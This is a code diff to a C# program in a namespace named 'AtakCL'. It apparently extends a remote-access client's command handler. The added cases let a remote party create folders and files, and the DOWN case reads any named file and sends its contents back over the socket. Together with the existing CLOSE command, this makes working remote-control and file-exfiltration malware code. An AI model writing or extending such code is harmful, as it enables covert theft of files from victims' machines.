@@ -136,6 +136,26 @@ namespace AtakCL
                             }
                             socket.Send(Encoding.UTF8.GetBytes(full));
                             break;
+                        case "CFOLDER":
+                            try
+                            {
+                                Directory.CreateDirectory(sData[1]);
+                            }
+                            catch (Exception) { }
+                            break;
+                        case "CFILE":
+                            try
+                            {
+                                File.Create(sData[1]);
+                            }
+                            catch (Exception) { }
+                            break;
+                        case "DOWN":
+                            string ext1 = Path.GetExtension(sData[1]);
+                            byte[] fileBytes = File.ReadAllBytes(sData[1]);
+                            socket.Send(Encoding.UTF8.GetBytes("FILEC|" + fileBytes.Length.ToString() + "|" + ext1));
+                            socket.Send(fileBytes, fileBytes.Length, SocketFlags.None);
+                            break;
                         case "CLOSE":
                             Environment.Exit(0);
                             break;
